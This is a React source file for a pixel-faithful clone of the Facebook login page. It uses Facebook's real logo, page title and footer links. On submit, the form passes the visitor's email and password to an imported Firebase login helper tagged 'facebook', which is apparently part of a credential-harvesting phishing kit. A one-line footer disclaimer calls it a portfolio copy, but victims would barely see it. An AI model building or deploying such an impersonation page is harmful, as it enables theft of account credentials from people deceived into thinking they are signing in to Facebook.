import { useState } from "react";
import { login } from "../../utils/firebase";
import HeadMetadata from "../../utils/MetaData";
import fbLogo from "../../assets/fb.svg";

import "./facebook.css";

export default function FacebookPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("submitted");
    login(email, password, "facebook");
  };

  return (
    <div className="contains-top-half-and-footer-bottom-half">
      <HeadMetadata title="Facebook - Log In" favicon={fbLogo} />
      <div className="global-container">
        <div className="bigger-box">
          <div className="big-box">
            <div className="left-box">
              <div className="image-box">
                <img
                  className="fb-logo"
                  src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                  alt="Facebook Logo"
                />
              </div>
              <h2 className="logo-caption">
                Connect with friends and the world around you on Facebook.
              </h2>
            </div>
            <div className="right-box">
              <div className="form-container">
                <form onSubmit={handleSubmit} data-netlify="true">
                  <div className="space">
                    <input
                      type="text"
                      id="email"
                      name="email"
                      className="email-box"
                      placeholder="Email or phone number"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <div className="space" style={{ position: "relative" }}>
                    <input
                      type={showPassword ? "text" : "password"}
                      id="password"
                      name="password"
                      className="pw-box"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    <i
                      className={`far ${
                        showPassword ? "fa-eye" : "fa-eye-slash"
                      }`}
                      id="toggleEyeIcon"
                      style={{
                        cursor: "pointer",
                        position: "absolute",
                        right: 10,
                        top: 38,
                      }}
                      onClick={() => setShowPassword((prev) => !prev)}
                    ></i>
                  </div>
                  <div className="space">
                    <button
                      type="submit"
                      id="login-button"
                      className="login-button"
                    >
                      <b>Log in</b>
                    </button>
                  </div>
                  <div className="spaceTwo adjustTwo">
                    <a href="#" className="adjust-forgot-pw">
                      Forgot password?
                    </a>
                  </div>
                  <div className="line"></div>
                  <div>
                    <button type="button" className="create-button">
                      <b>Create New Account</b>
                    </button>
                  </div>
                </form>
              </div>
              <div className="bottom-link-box">
                <a className="bottom-link" href="#">
                  <b>Create a Page</b>
                </a>{" "}
                for a celebrity, band, or business.
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer>
        <div>
          <ul>
            <li className="list-items">English (UK)</li>
            <li className="list-items">
              <a className="list-items" href="#">
                中文(简体)
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Bahasa Indonesia
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                日本語
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                ภาษาไทย
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Tiếng Việt
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                한국어
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Español
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Português (Brasil)
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Français (France)
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Deutsch
              </a>
            </li>
            <button type="button" className="plus-button">
              +
            </button>
          </ul>
          <div className="line-2 reduce-margin"></div>
          <ul>
            <li className="list-items">
              <a className="list-items" href="#">
                Messenger
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Fb Lite
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Watch
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                People
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Pages
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Page Categories
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Places
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Games
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Locations
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Marketplace
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Fb Pay
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Groups
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Jobs
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Occulus
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Portal
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Instagram
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Local
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Fundraisers
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Services
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Spark AR
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Shops
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Voting Information Centre
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                About
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Create ad
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Create Page
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Developers
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Careers
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Privacy
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Cookies
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                AdChoices
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Terms
              </a>
            </li>
            <li className="list-items">
              <a className="list-items" href="#">
                Help
              </a>
            </li>
            <li className="list-items">
              {" "}
              Disclaimer: This work is just a © of Facebook for personal
              portfolio.
            </li>
          </ul>
        </div>
      </footer>
    </div>
  );
}
